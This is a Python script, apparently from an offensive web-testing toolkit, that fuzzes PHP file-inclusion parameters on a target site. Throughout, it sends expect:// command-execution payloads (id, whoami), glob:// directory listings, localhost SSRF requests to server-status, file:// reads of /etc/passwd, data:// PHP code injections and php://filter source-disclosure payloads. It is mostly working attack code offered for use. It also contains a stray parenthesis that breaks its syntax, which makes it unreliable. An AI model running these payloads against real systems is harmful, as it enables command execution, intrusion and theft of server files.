import requests
import getopt
import sys
import common
import urllib3

urllib3.disable_warnings()

def help():
    pass


def wrapper_expect_fuzz(url, hcode=(), hsize=(), cookie=None, redirect=False):
    cmds = ["ls", "pwd", "id", "whoami", "cd"]
    for cmd in cmds:
        resp = requests.get(f"{url}expect://{cmd}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"expect://{cmd} [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}expect://{cmd}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"expect://{cmd}%00 [code:{resp.status_code} size:{len(resp.content)}]"))

   
def wrapper_glob_fuzz(url, hcode=(), hsize=(), cookie=None, redirect=False):
    dirs = ["/etc/", "/tmp/", "/var/www/html/"]
    resp = requests.get(f"{url}glob://*.*", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
    print(common.good_code(resp.status_code, f"glob://*.* [code:{resp.status_code} size:{len(resp.content)}]"))
    resp = requests.get(f"{url}glob://*.*%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
    print(common.good_code(resp.status_code, f"glob://*.*%00 [code:{resp.status_code} size:{len(resp.content)}]"))
    for d in dirs:
        resp = requests.get(f"{url}glob://{d}*", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"glob://{d}* [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}glob://{d}*%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"glob://{d}*%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}glob://{d}*.*", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"glob://{d}*.* [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}glob://{d}*.*%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"glob://{d}*.*%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        

        
def wrapper_http_fuzz(url, hcode=(), hsize=(), cookie=None, redirect=False):
    schemes = ["http", "https"]
    resp = requests.get(f"{url}{url}/server-status", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
    print(common.good_code(resp.status_code, f"{url}{url}/server-status [code:{resp.status_code} size:{len(resp.content)}]"))
    resp = requests.get(f"{url}{url}/", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
    print(common.good_code(resp.status_code, f"{url}{url}/ [code:{resp.status_code} size:{len(resp.content)}]"))
    resp = requests.get(f"{url}{url}/server-status%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
    print(common.good_code(resp.status_code, f"{url}{url}/server-status%00 [code:{resp.status_code} size:{len(resp.content)}]"))
    resp = requests.get(f"{url}{url}/%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
    print(common.good_code(resp.status_code, f"{url}{url}/%00 [code:{resp.status_code} size:{len(resp.content)}]"))
    
    for scheme in schemes:        
        for addr in common.ADDR_LOCALHOST:
            resp = requests.get(f"{url}{scheme}://{addr}/", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            print(common.good_code(resp.status_code, f"{url}{scheme}://{addr}/ [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{scheme}://{addr}/%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            print(common.good_code(resp.status_code, f"{url}{scheme}://{addr}/%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{scheme}://{addr}/server-status", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            print(common.good_code(resp.status_code, f"{url}{scheme}://{addr}/server-status [code:{resp.status_code} size:{len(resp.content)}]"))
            resp = requests.get(f"{url}{scheme}://{addr}/server-status%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
            print(common.good_code(resp.status_code, f"{url}{scheme}://{addr}/server-status%00 [code:{resp.status_code} size:{len(resp.content)}]"))


def wrapper_ftp_fuzz(url, hcode=(), hsize=(), cookie=None, redirect=False):
    for addr in common.ADDR_LOCALHOST:
        resp = requests.get(f"{url}ftp://{addr}/", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"{url}ftp://{addr}/ [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}ftp://{addr}/%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"{url}ftp://{addr}/%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}ftp://{addr}/pub", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"{url}ftp://{addr}/pub [code:{resp.status_code} size:{len(resp.content)}]"))
        resp = requests.get(f"{url}ftp://{addr}/pub%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
        print(common.good_code(resp.status_code, f"{url}ftp://{addr}/pub%00 [code:{resp.status_code} size:{len(resp.content)}]"))
    
    
def wrapper_file_fuzz(url, payload, hcode=(), hsize=(), cookie=None, redirect=False):
    resp = requests.get(f"{url}file://{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
    print(common.good_code(resp.status_code, f"{url}file://{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
    resp = requests.get(f"{url}file://{payload}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
    print(common.good_code(resp.status_code, f"{url}file://{payload}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
)
    
def wrapper_data_fuzz(url, payload, hcode=(), hsize=(), cookie=None, redirect=False):
    print(f"{url}data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>")
    print(f"{url}data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>%00")
    print(f"{url}data://text/plain,<?php echo base64_encode(phpinfo()); ?>")
    print(f"{url}data://text/plain,<?php echo base64_encode(phpinfo()); ?>%00")
    print(f"{url}data://text/plain,<?php phpinfo(); ?>")
    print(f"{url}data://text/plain,<?php phpinfo(); ?>%00")
    
def wrapper_compress_fuzz(url, payload, hcode=(), hsize=(), cookie=None, redirect=False):
    print(f"{url}compress.zlib://{payload}")
    print(f"{url}compress.zlib://{payload}%00")    
    print(f"{url}compress.bzip2://{payload}")
    print(f"{url}compress.bzip2://{payload}%00")
    
    
def wrapper_php_fuzz(url, payload, hcode=(), hsize=(), cookie=None, redirect=False):  
    for n in range(101):
        print(f"{url}php://fd/{n}")
        print(f"{url}php://fd/{n}%00")
    print(f"{url}php://filter/convert.base64-encode/resource={payload}")
    print(f"{url}php://filter/zlib.deflate/convert.base64-encode/resource={payload}")
    print(f"{url}php://filter/convert.quoted-printable-encode/resource={payload}")
    print(f"{url}php://filter/convert.iconv.utf-8.utf-16le/resource={payload}")    
    print(f"{url}php://filter/read=string.toupper|string.rot13|string.tolower/resource={payload}")
    print(f"{url}php://filter/string.strip_tags/resource={payload}")
    print(f"{url}php://filter/string.toupper/string.rot13/string.tolower/resource={payload}")    
    print(f"{url}php://filter/zlib.inflate/resource={payload}")


def main():       
    url = None
    path = None
    cookie = None
    redirect = False
    try:
        opts, args = getopt.getopt(sys.argv[1:], "u:p:c:r", ["url=", "path=", "cookie=", "redirect="])
        for opt, arg in opts:            
            if opt in ("-u", "--url"):                    
                url = arg
            elif opt in ("-p", "--path"):                    
                path = arg
            elif opt in ("-c", "--cookie"):                    
                cookie = common.parse_cookie(arg)
            elif opt in ("-r", "--redirect"):                    
                redirect = True
            else:
                help()
                sys.exit(0)
    except getopt.GetoptError as err:
        help()
        sys.exit(0)
    try:  
        if url is not None and path is not None:           
            url = common.parse_url(url)
            
            print("\n--------------------------")
            print("[!] Wrapper expect fuzzing")
            print("--------------------------\n")
            wrapper_expect_fuzz(url)
            
            print("\n------------------------")
            print("[!] Wrapper glob fuzzing")
            print("------------------------\n")
            wrapper_glob_fuzz(url)
            
            print("\n------------------------")
            print("[!] Wrapper http fuzzing")
            print("------------------------\n")
            wrapper_http_fuzz(url)

            """wrapper_ftp_fuzz("http://test.ru?page=")
            wrapper_file_fuzz("http://test.ru?page=", "/etc/passwd")
            wrapper_compress_fuzz("http://test.ru?page=", "/etc/passwd")
            wrapper_php_fuzz("http://test.ru?page=", "/etc/passwd")"""
        else:
            help()
    except KeyboardInterrupt:
        sys.exit(0)
    except requests.ConnectionError as e:
        print(e)
    except requests.Timeout as e:
        print(e)
    except requests.RequestException as e:
        print(e)

if __name__ == "__main__":
    main()

